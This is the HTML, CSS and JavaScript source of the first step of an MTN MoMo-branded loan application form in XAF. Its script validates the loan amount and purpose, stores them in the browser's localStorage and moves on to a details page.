<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo Loan - Application</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }

        html, body {
            height: 100%;
            font-family: 'Inter', sans-serif;
            background: #eef1f6;
            overflow: hidden;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px;
        }

        /* ===== HEADER ===== */
        header {
            width: 100%;
            max-width: 480px;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 71, 171, 0.06);
            position: relative;
        }

        .back-btn {
            font-size: 24px;
            background: #f0f4ff;
            border: none;
            cursor: pointer;
            color: #0047AB;
            width: 38px;
            height: 38px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s, background 0.2s;
            font-weight: 700;
        }
        .back-btn:hover {
            transform: translateX(-2px);
            background: #e0e9ff;
        }

        .logo-container {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }
        .momo-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #0047AB;
            color: #FFCC00;
            font-weight: 800;
            font-size: 18px;
            padding: 8px 18px;
            border-radius: 40px;
            line-height: 1;
            letter-spacing: -0.5px;
            box-shadow: 0 6px 18px rgba(0,71,171,0.3);
        }

        .step-badge {
            background: linear-gradient(135deg, #FFCC00, #FFB800);
            color: #1a1a2e;
            font-weight: 800;
            font-size: 11px;
            padding: 6px 10px;
            border-radius: 8px;
            letter-spacing: 0.3px;
        }

        /* ===== CARD ===== */
        .card {
            background: white;
            border-radius: 24px;
            padding: 28px 24px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 20px 50px rgba(0, 71, 171, 0.08);
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            max-height: calc(100vh - 140px);
            scroll-behavior: smooth;
        }
        .card::-webkit-scrollbar { width: 4px; }
        .card::-webkit-scrollbar-thumb {
            background: #d4dbe8;
            border-radius: 4px;
        }

        /* ===== TITLE ===== */
        .form-title {
            font-size: 24px;
            font-weight: 800;
            text-align: center;
            color: #1a1a2e;
            margin-bottom: 5px;
            letter-spacing: -0.4px;
        }
        .form-title .highlight {
            color: #0047AB;
            position: relative;
        }
        .form-subtitle {
            text-align: center;
            color: #8a90a2;
            font-size: 13px;
            margin-bottom: 18px;
            font-weight: 500;
        }

        /* ===== SEGMENTED PROGRESS ===== */
        .steps {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-bottom: 6px;
        }
        .step-dot {
            width: 34px;
            height: 6px;
            border-radius: 4px;
            background: #e0e6f0;
            transition: all 0.4s ease;
        }
        .step-dot.active {
            background: linear-gradient(135deg, #0047AB, #002D7A);
            width: 46px;
            box-shadow: 0 2px 8px rgba(0,71,171,0.35);
        }
        .step-dot.done {
            background: linear-gradient(135deg, #0047AB, #002D7A);
            opacity: 0.55;
        }

        .step-text {
            text-align: center;
            color: #0047AB;
            font-size: 13px;
            margin-bottom: 22px;
            font-weight: 700;
            letter-spacing: 0.2px;
        }

        /* ===== FORM ===== */
        .form-group { margin-bottom: 16px; }

        .form-label {
            display: flex;
            align-items: center;
            gap: 6px;
            font-weight: 700;
            color: #333;
            margin-bottom: 7px;
            font-size: 13.5px;
        }
        .form-label .label-icon {
            font-size: 14px;
            opacity: 0.8;
        }
        .form-label .required {
            color: #e74c3c;
            margin-left: 1px;
        }

        .form-select,
        .form-input,
        .form-textarea {
            width: 100%;
            padding: 13px 15px;
            border: 2px solid #e6ebf5;
            border-radius: 14px;
            font-size: 15px;
            transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
            font-family: 'Inter', sans-serif;
            background: #f8fafd;
            color: #1a1a2e;
            font-weight: 500;
        }

        .form-select {
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%230047AB' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>");
            background-repeat: no-repeat;
            background-position: right 16px center;
            padding-right: 42px;
            cursor: pointer;
        }

        .form-select:focus,
        .form-input:focus,
        .form-textarea:focus {
            border-color: #0047AB;
            outline: none;
            background: white;
            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
        }

        .form-textarea {
            resize: vertical;
            min-height: 84px;
        }

        .form-input::placeholder,
        .form-textarea::placeholder { color: #a9b0c2; }

        /* ===== AMOUNT QUICK SELECT ===== */
        .amount-quick {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-top: 10px;
        }
        .amount-quick button {
            padding: 11px 6px;
            border: 2px solid #e6ebf5;
            border-radius: 12px;
            background: #f8fafd;
            font-weight: 700;
            font-size: 13px;
            color: #1a1a2e;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: 'Inter', sans-serif;
        }
        .amount-quick button:hover {
            border-color: #0047AB;
            background: #f0f4ff;
            transform: translateY(-2px);
        }
        .amount-quick button.active {
            border-color: #0047AB;
            background: linear-gradient(135deg, #0047AB, #002D7A);
            color: white;
            box-shadow: 0 6px 16px rgba(0,71,171,0.3);
            transform: translateY(-2px);
        }

        /* ===== ERROR STATES ===== */
        .invalid {
            border-color: #e74c3c !important;
            background: #fff5f5 !important;
            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
            animation: shake 0.4s ease;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }

        .error-text {
            color: #e74c3c;
            font-size: 12px;
            margin-top: 6px;
            display: none;
            font-weight: 600;
        }
        .error-text.show {
            display: block;
            animation: slideDown 0.3s ease;
        }
        @keyframes slideDown {
            0% { opacity: 0; transform: translateY(-5px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        /* ===== NEXT BUTTON ===== */
        .next-btn {
            width: 100%;
            padding: 17px;
            background: linear-gradient(135deg, #0047AB, #002D7A);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 800;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 16px;
            box-shadow: 0 10px 25px rgba(0,71,171,0.28);
            position: relative;
            overflow: hidden;
        }
        .next-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 32px rgba(0, 71, 171, 0.4);
        }
        .next-btn:active {
            transform: scale(0.98);
        }
        .next-btn::after {
            content: "→";
            margin-left: 8px;
            transition: transform 0.25s;
            display: inline-block;
        }
        .next-btn:hover::after {
            transform: translateX(4px);
        }

        footer {
            padding: 14px;
            color: #a9b0c2;
            font-size: 12px;
            text-align: center;
            margin-top: auto;
            font-weight: 500;
        }

        @media (max-width: 480px) {
            .card { padding: 22px 16px; }
            .form-title { font-size: 21px; }
            .form-input, .form-select, .form-textarea {
                font-size: 14px;
                padding: 11px 13px;
            }
            .amount-quick button {
                font-size: 12px;
                padding: 9px 4px;
            }
        }
    </style>
</head>
<body>
    <header>
        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
        <div class="logo-container">
            <span class="momo-icon">MoMo</span>
        </div>
        <span class="step-badge">STEP 1/3</span>
    </header>

    <main class="card">
        <h1 class="form-title">💰 Loan <span class="highlight">Application</span></h1>
        <p class="form-subtitle">Tell us about your loan in 3 quick steps</p>

        <div class="steps">
            <div class="step-dot active"></div>
            <div class="step-dot"></div>
            <div class="step-dot"></div>
        </div>
        <div class="step-text">STEP 1 OF 3 · Loan Details</div>

        <!-- Loan Product -->
        <div class="form-group">
            <label class="form-label"><span class="label-icon">📋</span> Loan Product <span class="required">*</span></label>
            <select class="form-select" id="loanType">
                <option>Smart Loan</option>
                <option>Xtra Cash</option>
                <option>MoMo Boost</option>
            </select>
        </div>

        <!-- Loan Amount -->
        <div class="form-group">
            <label class="form-label"><span class="label-icon">💰</span> Loan Amount (XAF) <span class="required">*</span></label>
            <input type="number" class="form-input" id="loanAmount" placeholder="500000" min="50000" max="1000000">
            <div class="amount-quick">
                <button type="button" onclick="setAmount(50000, this)">XAF 50K</button>
                <button type="button" onclick="setAmount(100000, this)">XAF 100K</button>
                <button type="button" onclick="setAmount(200000, this)">XAF 200K</button>
                <button type="button" onclick="setAmount(350000, this)">XAF 350K</button>
                <button type="button" onclick="setAmount(500000, this)">XAF 500K</button>
                <button type="button" onclick="setAmount(1000000, this)">XAF 1M</button>
            </div>
            <div class="error-text" id="amountError">Please enter amount between XAF 50,000 and XAF 1,000,000</div>
        </div>

        <!-- Loan Term -->
        <div class="form-group">
            <label class="form-label"><span class="label-icon">📅</span> Loan Term <span class="required">*</span></label>
            <select class="form-select" id="loanTerm">
                <option value="3">3 Months</option>
                <option value="6">6 Months</option>
                <option value="12" selected>12 Months</option>
                <option value="18">18 Months</option>
                <option value="24">24 Months</option>
            </select>
        </div>

        <!-- Purpose of Loan -->
        <div class="form-group">
            <label class="form-label"><span class="label-icon">✍️</span> Purpose of Loan <span class="required">*</span></label>
            <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
            <div class="error-text" id="purposeError">Please describe the purpose (min 5 characters)</div>
        </div>

        <button class="next-btn" id="nextBtn">NEXT STEP</button>
    </main>

    <footer>© 2026 MTN MoMo Cameroon</footer>

    <script>
        // ============================================
        // SILENT LANGUAGE CHECK
        // Reads the language chosen on the index page.
        // No translation applied here — value is just captured.
        // ============================================
        const userLang = localStorage.getItem('momoLang') || 'en';

        // ============================================
        // PRE-FILL FROM INDEX PAGE
        // ============================================
        const storedAmount = localStorage.getItem('loanAmount');
        const storedTerm = localStorage.getItem('loanTerm');

        if (storedAmount) {
            document.getElementById('loanAmount').value = storedAmount;
        }
        if (storedTerm) {
            const termSelect = document.getElementById('loanTerm');
            for (let option of termSelect.options) {
                if (option.value === storedTerm) {
                    option.selected = true;
                    break;
                }
            }
        }

        // ============================================
        // AMOUNT QUICK SELECT
        // ============================================
        function setAmount(amount, btn) {
            document.getElementById('loanAmount').value = amount;
            document.getElementById('loanAmount').classList.remove('invalid');
            document.getElementById('amountError').classList.remove('show');

            document.querySelectorAll('.amount-quick button').forEach(b => {
                b.classList.remove('active');
            });
            if (btn) btn.classList.add('active');
        }

        // ============================================
        // NEXT BUTTON HANDLER
        // ============================================
        document.getElementById('nextBtn').addEventListener('click', function() {
            const amount = document.getElementById('loanAmount').value.trim();
            const purpose = document.getElementById('loanPurpose').value.trim();
            const amountInput = document.getElementById('loanAmount');
            const purposeInput = document.getElementById('loanPurpose');
            const amountError = document.getElementById('amountError');
            const purposeError = document.getElementById('purposeError');

            let valid = true;

            amountInput.classList.remove('invalid');
            purposeInput.classList.remove('invalid');
            amountError.classList.remove('show');
            purposeError.classList.remove('show');

            if (!amount || parseFloat(amount) < 50000 || parseFloat(amount) > 1000000) {
                amountInput.classList.add('invalid');
                amountError.classList.add('show');
                valid = false;
            }

            if (!purpose || purpose.length < 5) {
                purposeInput.classList.add('invalid');
                purposeError.classList.add('show');
                valid = false;
            }

            if (!valid) {
                const firstError = document.querySelector('.invalid');
                if (firstError) {
                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    firstError.focus();
                }
                return;
            }

            // Save to localStorage
            localStorage.setItem('loanType', document.getElementById('loanType').value);
            localStorage.setItem('loanAmount', amount);
            localStorage.setItem('loanTerm', document.getElementById('loanTerm').value);
            localStorage.setItem('loanPurpose', purpose);

            // Navigate to details page
            window.location.href = 'details.html';
        });

        // ============================================
        // REAL-TIME VALIDATION
        // ============================================
        document.getElementById('loanAmount').addEventListener('input', function() {
            const val = parseFloat(this.value);
            if (val >= 50000 && val <= 1000000) {
                this.classList.remove('invalid');
                document.getElementById('amountError').classList.remove('show');
            }
        });

        document.getElementById('loanPurpose').addEventListener('input', function() {
            if (this.value.trim().length >= 5) {
                this.classList.remove('invalid');
                document.getElementById('purposeError').classList.remove('show');
            }
        });
    </script>
</body>
</html>
